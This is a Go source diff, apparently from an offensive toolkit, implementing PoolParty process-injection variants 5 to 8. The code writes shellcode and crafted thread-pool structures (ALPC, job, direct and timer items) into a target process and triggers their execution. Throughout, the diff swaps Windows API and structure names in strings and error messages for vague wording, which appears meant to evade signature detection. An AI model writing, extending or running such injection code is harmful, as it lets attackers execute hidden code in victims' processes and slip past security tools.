@@ -11,7 +11,7 @@ import (
 )
 
 func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(5, "TP_ALPC Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(5, "port item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -39,12 +39,12 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		0, // PortAttributes
 	)
 	if status != 0 {
-		return output, fmt.Errorf("NtAlpcCreatePort (temp) failed: 0x%X", status)
+		return output, fmt.Errorf("port creation (temp) failed: 0x%X", status)
 	}
 	defer windows.CloseHandle(windows.Handle(hTempAlpc))
 	output += fmt.Sprintf("[+] Created temporary ALPC port: 0x%X\n", hTempAlpc)
 
-	// Step 6: Allocate TP_ALPC structure via TpAllocAlpcCompletion
+	// Step 6: Allocate port item structure via TpAllocAlpcCompletion
 	var pTpAlpc uintptr
 	status, _, _ = procTpAllocAlpcCompletion.Call(
 		uintptr(unsafe.Pointer(&pTpAlpc)),
@@ -56,7 +56,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if status != 0 {
 		return output, fmt.Errorf("TpAllocAlpcCompletion failed: 0x%X", status)
 	}
-	output += "[+] Created TP_ALPC structure associated with shellcode\n"
+	output += "[+] Created port item structure associated with shellcode\n"
 
 	// Explicitly set the Direct.Callback to shellcode address (similar to variant 4)
 	pAlpcStruct := (*FULL_TP_ALPC)(unsafe.Pointer(pTpAlpc))
@@ -90,26 +90,26 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		uintptr(unsafe.Pointer(&portAttr)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("NtAlpcCreatePort failed: 0x%X", status)
+		return output, fmt.Errorf("port creation failed: 0x%X", status)
 	}
 	defer windows.CloseHandle(windows.Handle(hAlpc))
 	output += fmt.Sprintf("[+] Created ALPC port '%s'\n", portName)
 
-	// Step 9: Allocate memory for TP_ALPC in target process
+	// Step 9: Allocate memory for port item in target process
 	var tpAlpc FULL_TP_ALPC
 	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_ALPC failed: %w", err)
+		return output, fmt.Errorf("remote allocation for port item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)
+	output += fmt.Sprintf("[+] Allocated port item memory at: 0x%X\n", tpAlpcAddr)
 
-	// Step 10: Write TP_ALPC to target process
+	// Step 10: Write port item to target process
 	tpAlpcBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpAlpc))[:unsafe.Sizeof(tpAlpc)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpAlpcAddr, tpAlpcBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_ALPC failed: %w", err)
+		return output, fmt.Errorf("memory write for port item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_ALPC structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote port item structure (%d bytes)\n", bytesWritten)
 
 	// Step 11: Associate ALPC port with target's I/O completion port
 	alpcAssoc := ALPC_PORT_ASSOCIATE_COMPLETION_PORT{
@@ -123,7 +123,7 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		uintptr(unsafe.Sizeof(alpcAssoc)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("NtAlpcSetInformation failed: 0x%X", status)
+		return output, fmt.Errorf("port info set failed: 0x%X", status)
 	}
 	output += "[+] Associated ALPC port with target's I/O completion port\n"
 
@@ -163,9 +163,9 @@ func executeVariant5(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	return output, nil
 }
 
-// executeVariant6 implements TP_JOB Insertion via Job object assignment
+// executeVariant6 implements job item Insertion via Job object assignment
 func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(6, "TP_JOB Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(6, "job item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -198,7 +198,7 @@ func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	defer windows.CloseHandle(windows.Handle(hJob))
 	output += fmt.Sprintf("[+] Created job object '%s'\n", jobName)
 
-	// Step 6: Allocate TP_JOB structure via TpAllocJobNotification
+	// Step 6: Allocate job item structure via TpAllocJobNotification
 	var pTpJob uintptr
 	status, _, _ := procTpAllocJobNotification.Call(
 		uintptr(unsafe.Pointer(&pTpJob)),
@@ -210,23 +210,23 @@ func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if status != 0 {
 		return output, fmt.Errorf("TpAllocJobNotification failed: 0x%X", status)
 	}
-	output += "[+] Created TP_JOB structure associated with shellcode\n"
+	output += "[+] Created job item structure associated with shellcode\n"
 
-	// Step 7: Allocate memory for TP_JOB in target process
+	// Step 7: Allocate memory for job item in target process
 	var tpJob FULL_TP_JOB
 	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_JOB failed: %w", err)
+		return output, fmt.Errorf("remote allocation for job item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)
+	output += fmt.Sprintf("[+] Allocated job item memory at: 0x%X\n", tpJobAddr)
 
-	// Step 8: Write TP_JOB to target process
+	// Step 8: Write job item to target process
 	tpJobBytes := (*[1 << 20]byte)(unsafe.Pointer(pTpJob))[:unsafe.Sizeof(tpJob)]
 	bytesWritten, err := injectWriteMemory(hProcess, tpJobAddr, tpJobBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_JOB failed: %w", err)
+		return output, fmt.Errorf("memory write for job item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_JOB structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote job item structure (%d bytes)\n", bytesWritten)
 
 	// Step 9: Zero out existing job completion info (required before re-setting)
 	var zeroAssoc JOBOBJECT_ASSOCIATE_COMPLETION_PORT
@@ -272,9 +272,9 @@ func executeVariant6(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	return output, nil
 }
 
-// executeVariant7 implements TP_DIRECT Insertion via I/O Completion Port
+// executeVariant7 implements direct item Insertion via I/O Completion Port
 func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(7, "TP_DIRECT Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(7, "direct item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -294,7 +294,7 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		return output, err
 	}
 
-	// Step 4: Create and write TP_DIRECT structure
+	// Step 4: Create and write direct item structure
 	tpDirect := TP_DIRECT{
 		Callback: shellcodeAddr,
 	}
@@ -302,24 +302,24 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %w", err)
+		return output, fmt.Errorf("remote allocation for direct item failed: %w", err)
 	}
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_DIRECT failed: %w", err)
+		return output, fmt.Errorf("memory write for direct item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] TP_DIRECT at: 0x%X\n", tpDirectAddr)
+	output += fmt.Sprintf("[+] direct item at: 0x%X\n", tpDirectAddr)
 
 	// Step 8: Queue completion packet via ZwSetIoCompletion
 	status, _, _ := procZwSetIoCompletion.Call(
 		uintptr(hIoCompletion),
-		tpDirectAddr, // KeyContext - pointer to TP_DIRECT
+		tpDirectAddr, // KeyContext - pointer to direct item
 		0,            // ApcContext
 		0,            // IoStatus
 		0,            // IoStatusInformation
 	)
 	if status != 0 {
-		return output, fmt.Errorf("ZwSetIoCompletion failed: 0x%X", status)
+		return output, fmt.Errorf("completion queue failed: 0x%X", status)
 	}
 	output += "[+] Queued packet to I/O completion port\n"
 	output += "[+] PoolParty Variant 7 injection completed successfully\n"
@@ -327,9 +327,9 @@ func executeVariant7(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	return output, nil
 }
 
-// executeVariant8 implements TP_TIMER Insertion - Variant 8
+// executeVariant8 implements timer item Insertion - Variant 8
 func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, error) {
-	hProcess, output, err := poolPartyInit(8, "TP_TIMER Insertion", shellcode, pid)
+	hProcess, output, err := poolPartyInit(8, "timer item Insertion", shellcode, pid)
 	if err != nil {
 		return output, err
 	}
@@ -351,7 +351,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	defer windows.CloseHandle(hTimer)
 	output += fmt.Sprintf("[+] Hijacked timer queue handle: 0x%X\n", hTimer)
 
-	// Step 4: Query worker factory to get TP_POOL address
+	// Step 4: Query worker factory to get pool address
 	var workerFactoryInfo WORKER_FACTORY_BASIC_INFORMATION
 	var returnLength uint32
 	status, _, _ := procNtQueryInformationWorkerFactory.Call(
@@ -364,7 +364,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if status != 0 {
 		return output, fmt.Errorf("NtQueryInformationWorkerFactory failed: 0x%X", status)
 	}
-	output += fmt.Sprintf("[+] Worker factory start parameter (TP_POOL): 0x%X\n", workerFactoryInfo.StartParameter)
+	output += fmt.Sprintf("[+] Worker factory start parameter (pool): 0x%X\n", workerFactoryInfo.StartParameter)
 
 	// Step 5: Allocate and write shellcode (W^X: RW → write → RX)
 	shellcodeAddr, output, err := poolPartyAllocShellcode(hProcess, shellcode, output, cfgBypass)
@@ -372,7 +372,7 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 		return output, err
 	}
 
-	// Step 6: Create TP_TIMER structure via CreateThreadpoolTimer
+	// Step 6: Create timer item structure via CreateThreadpoolTimer
 	pTpTimer, _, err := procCreateThreadpoolTimer.Call(
 		shellcodeAddr, // Timer callback points to shellcode
 		0,             // Context
@@ -381,24 +381,24 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	if pTpTimer == 0 {
 		return output, fmt.Errorf("timer item creation failed: %w", err)
 	}
-	output += "[+] Created TP_TIMER structure associated with shellcode\n"
+	output += "[+] Created timer item structure associated with shellcode\n"
 
-	// Step 7: Allocate memory for TP_TIMER in target process
+	// Step 7: Allocate memory for timer item in target process
 	var tpTimer FULL_TP_TIMER
 	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("remote allocation for TP_TIMER failed: %w", err)
+		return output, fmt.Errorf("remote allocation for timer item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)
+	output += fmt.Sprintf("[+] Allocated timer item memory at: 0x%X\n", tpTimerAddr)
 
 	// Step 8: Cast the pointer to access the structure directly like SafeBreach does
 	// SafeBreach directly modifies the structure returned by CreateThreadpoolTimer
 	pTimer := (*FULL_TP_TIMER)(unsafe.Pointer(pTpTimer))
 
-	// Step 9: Modify TP_TIMER structure for insertion
+	// Step 9: Modify timer item structure for insertion
 	const timeout int64 = -10000000 // 1 second in 100-nanosecond intervals (negative = relative)
 
-	// Set Pool pointer to target's TP_POOL
+	// Set Pool pointer to target's pool
 	pTimer.Work.CleanupGroupMember.Pool = workerFactoryInfo.StartParameter
 
 	// Note: CreateThreadpoolTimer should have set the Callback to shellcodeAddr already
@@ -421,78 +421,69 @@ func executeVariant8(shellcode []byte, pid uint32, cfgBypass bool) (string, erro
 	pTimer.WindowEndLinks.Children.Flink = remoteWindowEndChildrenAddr
 	pTimer.WindowEndLinks.Children.Blink = remoteWindowEndChildrenAddr
 
-	// Step 10: Write TP_TIMER to target process
+	// Step 10: Write timer item to target process
 	timerBytes := (*[unsafe.Sizeof(FULL_TP_TIMER{})]byte)(unsafe.Pointer(pTpTimer))[:]
 	bytesWritten, err := injectWriteMemory(hProcess, tpTimerAddr, timerBytes)
 	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for TP_TIMER failed: %w", err)
+		return output, fmt.Errorf("memory write for timer item failed: %w", err)
 	}
-	output += fmt.Sprintf("[+] Wrote TP_TIMER structure (%d bytes)\n", bytesWritten)
+	output += fmt.Sprintf("[+] Wrote timer item structure (%d bytes)\n", bytesWritten)
 
-	// Step 11: Calculate addresses for WindowStart and WindowEnd roots in target TP_POOL
+	output, err = poolPartyV8LinkTimerQueue(hProcess, hTimer, workerFactoryInfo.StartParameter, tpTimerAddr, timeout, output)
+	if err != nil {
+		return output, err
+	}
+	output += "[+] PoolParty Variant 8 injection completed successfully\n"
+	return output, nil
+}
 
-	// Step 12: Update TP_POOL's TimerQueue WindowStart and WindowEnd roots to point to our timer
-	// SafeBreach writes to pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root
-
-	targetTpPoolAddr := workerFactoryInfo.StartParameter
-
-	// Calculate offsets step by step - Go doesn't handle nested offsetof well
+func poolPartyV8LinkTimerQueue(hProcess uintptr, hTimer windows.Handle, poolAddr uintptr, tpTimerAddr uintptr, timeout int64, output string) (string, error) {
 	var dummyPool FULL_TP_POOL
 	var dummyTimerQueue TPP_TIMER_QUEUE
 	var dummySubQueue TPP_TIMER_SUBQUEUE
+	var dummyTimer FULL_TP_TIMER
 
-	timerQueueOffset := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
-	absoluteQueueOffset := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
-	windowStartOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
-	windowEndOffset := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
+	timerQueueOff := uintptr(unsafe.Offsetof(dummyPool.TimerQueue))
+	absQueueOff := uintptr(unsafe.Offsetof(dummyTimerQueue.AbsoluteQueue))
+	winStartOff := uintptr(unsafe.Offsetof(dummySubQueue.WindowStart))
+	winEndOff := uintptr(unsafe.Offsetof(dummySubQueue.WindowEnd))
 
-	// WindowStart.Root and WindowEnd.Root - Root is first field of TPP_PH so offset is 0
-	windowStartRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowStartOffset
-	windowEndRootAddr := targetTpPoolAddr + timerQueueOffset + absoluteQueueOffset + windowEndOffset
+	windowStartRootAddr := poolAddr + timerQueueOff + absQueueOff + winStartOff
+	windowEndRootAddr := poolAddr + timerQueueOff + absQueueOff + winEndOff
 
-	// Calculate address of our timer's WindowStartLinks and WindowEndLinks
-	remoteWindowStartLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
-	remoteWindowEndLinksAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))
+	remoteWinStartAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowStartLinks))
+	remoteWinEndAddr := tpTimerAddr + uintptr(unsafe.Offsetof(dummyTimer.WindowEndLinks))
 
-	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", targetTpPoolAddr)
-	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOffset, absoluteQueueOffset)
-	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", windowStartOffset, windowEndOffset)
+	output += fmt.Sprintf("[*] Debug: targetTpPoolAddr = 0x%X\n", poolAddr)
+	output += fmt.Sprintf("[*] Debug: timerQueueOffset = 0x%X, absoluteQueueOffset = 0x%X\n", timerQueueOff, absQueueOff)
+	output += fmt.Sprintf("[*] Debug: windowStartOffset = 0x%X, windowEndOffset = 0x%X\n", winStartOff, winEndOff)
 	output += fmt.Sprintf("[*] Debug: windowStartRootAddr = 0x%X\n", windowStartRootAddr)
 	output += fmt.Sprintf("[*] Debug: windowEndRootAddr = 0x%X\n", windowEndRootAddr)
-	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWindowStartLinksAddr)
-	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWindowEndLinksAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowStartLinksAddr = 0x%X\n", remoteWinStartAddr)
+	output += fmt.Sprintf("[*] Debug: remoteWindowEndLinksAddr = 0x%X\n", remoteWinEndAddr)
 
-	// Write WindowStartLinks address to WindowStart.Root
-	windowStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowStartLinksAddr))[:]
-	_, err = injectWriteMemory(hProcess, windowStartRootAddr, windowStartBytes)
-	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for WindowStart.Root failed: %w", err)
+	winStartBytes := (*[8]byte)(unsafe.Pointer(&remoteWinStartAddr))[:]
+	if _, err := injectWriteMemory(hProcess, windowStartRootAddr, winStartBytes); err != nil {
+		return output, fmt.Errorf("memory write for WindowStart.Root failed: %w", err)
 	}
 
-	// Write WindowEndLinks address to WindowEnd.Root
-	windowEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWindowEndLinksAddr))[:]
-	_, err = injectWriteMemory(hProcess, windowEndRootAddr, windowEndBytes)
-	if err != nil {
-		return output, fmt.Errorf("WriteProcessMemory for WindowEnd.Root failed: %w", err)
+	winEndBytes := (*[8]byte)(unsafe.Pointer(&remoteWinEndAddr))[:]
+	if _, err := injectWriteMemory(hProcess, windowEndRootAddr, winEndBytes); err != nil {
+		return output, fmt.Errorf("memory write for WindowEnd.Root failed: %w", err)
 	}
-	output += "[+] Modified target process's TP_POOL timer queue to point to TP_TIMER\n"
+	output += "[+] Modified target process's pool timer queue to point to timer item\n"
 
-	// Step 13: Set the timer to expire via NtSetTimer2
-	var dueTime int64
-	dueTime = timeout
-
+	dueTime := timeout
 	var params T2_SET_PARAMETERS
-	status, _, _ = procNtSetTimer2.Call(
+	status, _, _ := procNtSetTimer2.Call(
 		uintptr(hTimer),
 		uintptr(unsafe.Pointer(&dueTime)),
-		0, // Period
+		0,
 		uintptr(unsafe.Pointer(&params)),
 	)
 	if status != 0 {
-		return output, fmt.Errorf("NtSetTimer2 failed: 0x%X", status)
+		return output, fmt.Errorf("timer set failed: 0x%X", status)
 	}
 	output += "[+] Set timer to expire and trigger TppTimerQueueExpiration\n"
-	output += "[+] PoolParty Variant 8 injection completed successfully\n"
-
 	return output, nil
 }
